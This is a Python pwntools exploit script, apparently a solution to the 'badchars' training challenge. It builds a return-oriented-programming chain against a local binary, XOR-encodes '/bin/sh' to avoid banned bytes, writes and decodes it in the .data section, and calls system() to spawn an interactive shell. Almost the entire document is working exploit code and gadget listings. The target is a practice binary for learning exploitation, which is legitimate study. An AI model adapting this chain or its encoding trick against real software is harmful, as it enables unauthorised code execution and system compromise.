from pwn import *

'''
rabin -S badchars
25 0x00001070    16 0x00601070    16 -rw- .data

00000000004006f0 <system@plt>:
  4006f0:	ff 25 32 09 20 00    	jmpq   *0x200932(%rip)        # 601028 <system@GLIBC_2.2.5>
  4006f6:	68 02 00 00 00       	pushq  $0x2
  4006fb:	e9 c0 ff ff ff       	jmpq   4006c0 <.plt>

0x004006f0    1 6            sym.imp.system

0x0000000000400b3b: pop r12; pop r13; ret; 
0x0000000000400b34: mov qword ptr [r13], r12; ret;
0x0000000000400b40: pop r14; pop r15; ret; 
0x0000000000400b30: xor byte ptr [r15], r14b; ret;  
0x0000000000400b39: pop rdi; ret; 
'''

def main():
	data_segment = 0x00601050 #70
	system_plt = 0x004006f0
	pop_r12_r13 = 0x0000000000400b3b
	mov_r13_r12 = 0x0000000000400b34
	pop_r14_r15 = 0x0000000000400b40
	xor_r15_r14 = 0x0000000000400b30
	pop_rdi = 0x0000000000400b39
	xor_byte = 0x23

	bin_sh = "/bin/sh\x00"
	bin_sh_enc = ''

	#encode /bin/sh
	for i in bin_sh:
		bin_sh_enc += chr(xor_byte ^ ord(i))

	payload = 'A' * 40

	#store encoded /bin//sh to stack
	payload += p64(pop_r12_r13)
	payload += bin_sh_enc
	payload += p64(data_segment)
	payload += p64(mov_r13_r12)

	#decode
	for i in range(len(bin_sh_enc)):
		payload += p64(pop_r14_r15)
		payload += p64(xor_byte)
		payload += p64(data_segment + i)
		payload += p64(xor_r15_r14)

	#call system
	payload += p64(pop_rdi)
	payload += p64(data_segment)
	payload += p64(system_plt)

	p = process('./badchars')
	print p.recvrepeat(0.2)
	p.sendline(payload)
	p.interactive()

if __name__ == '__main__':
	main()

